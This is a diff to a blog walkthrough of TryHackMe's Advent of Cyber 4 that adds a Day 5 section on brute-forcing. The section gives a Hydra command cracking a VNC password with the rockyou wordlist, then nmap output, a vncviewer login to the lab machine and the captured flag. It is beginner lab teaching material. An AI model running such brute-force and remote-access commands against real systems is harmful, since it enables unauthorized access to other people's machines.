@@ -2,7 +2,7 @@
 title: Try Hack Me - Advent of Cyber 4 (2022)
 date: 2022-12-01 00:28:00 -500
 categories: [ctf,try hack me]
-tags: [writeup,walkthrough,frameworks,log analysis,OSINT,Scanning]
+tags: [writeup,walkthrough,frameworks,log analysis,OSINT,scanning,brute-forcing]
 ---
 
 After waiting for a full year, it's finally back! [Try Hack Me](https://tryhackme.com) is hosting their famous [Advent of Cyber](https://tryhackme.com/room/adventofcyber4) for the 4th time. It consists of a series of beginner challenges, which you can complete every day from the first of December until Christmas. I thought it would be cool to give it a go, so I'll try to update everyday (or as soon as I can) for the different challenges I complete.
@@ -15,6 +15,7 @@ They have a cool story following the whole duration of the challenges, which exp
 - [Day 2 - Santa's Naughty and Nice Log (Log Analysis)](#day-2---santas-naughty-and-nice-log-log-analysis)
 - [Day 3 - Nothing escapes detective McRed  (OSINT)](#day-3---nothing-escapes-detective-mcred--osint)
 - [Day 4 - Scanning through the snow (Scanning)](#day-4---scanning-through-the-snow-scanning)
+- [Day 5 - He knows when you're awake (Brute-Forcing)](#day-5---he-knows-when-youre-awake-brute-forcing)
 - [Next days incoming ...](#next-days-incoming-)
 
 # Day 1 - Someone's coming to town! (Frameworks)
@@ -248,6 +249,56 @@ santaaccounts   santa400
 
 **What is the password for the username santahr?** As we can see in the output of the `cat unserlist.txt` command, the password is `santa25`.
 
-See you tomorrow!
+# Day 5 - He knows when you're awake (Brute-Forcing)
+
+Welcome to Day 5 of Advent of Cyber.  Today we'll be discovering a password via brute-forcing, and using it to connect to the VNC server.  Let's see what they ask us to do:
+
+**Use Hydra to find the VNC password of the target with IP address `<IP_ADDRESS>`. What is the password?**
+
+We will the use the tool *Hydra* for that. The command we want to use has the following syntax: 
+
+`hydra -l username -P wordlist.txt server service`
+* username : they didn't give us a specific username, so let's try it without one.
+* wordlist.txt : On kali linux there are already pre-made wordlists. We'll be using `/usr/share/wordlists/rockyou.txt`
+* server : that's the IP address given when starting the machine. In my case it's `10.10.170.133`
+* service : which service we want to launch the attack to (`ssh`, `rdp`, `ftp`, `vnc`, etc). In this case they are asking us for `vnc`
+
+So we run `hydra -P /usr/share/wordlists/rockyou.txt 10.10.170.130 vnc`
+
+![puzzle 3](/images/adventofcyber_day5_hydra.png)
+
+After a while, it finds a valid pair, which means that there was no user, and the password is `1q2w3e4r`. 
+
+**Using a VNC client on the AttackBox, connect to the target of IP address MACHINE_IP. What is the flag written on the target’s screen?**
+
+To solve this, I decided to use `vncviewer`. The syntax is `vncviewer host::port`. We are missing the port, so we can just run the following nmap command: 
+
+```
+└─$ nmap -sV 10.10.170.133  
+Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2022-12-05 12:36 EST  
+Nmap scan report for 10.10.170.133  
+Host is up (0.034s latency).  
+Not shown: 998 closed tcp ports (conn-refused)  
+PORT     STATE SERVICE VERSION  
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
+5900/tcp open  vnc     VNC (protocol 3.8)  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+  
+Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
+Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
+```
+
+We find then that the port is `5900`, and we can now connect to the target via vnc. 
+
+```
+└─$ vncviewer 10.10.170.133::5900  
+Connected to RFB server, using protocol version 3.8  
+Performing standard VNC authentication  
+Password:  
+Authentication successful  
+```
+And automatically, the remote target's window pops up:
+![puzzle 3](/images/adventofcyber_day5_vnc.png)
+We can see on the background of the screen that the flag is `THM{I_SEE_YOUR_SCREEN}`.
 
 # Next days incoming ...
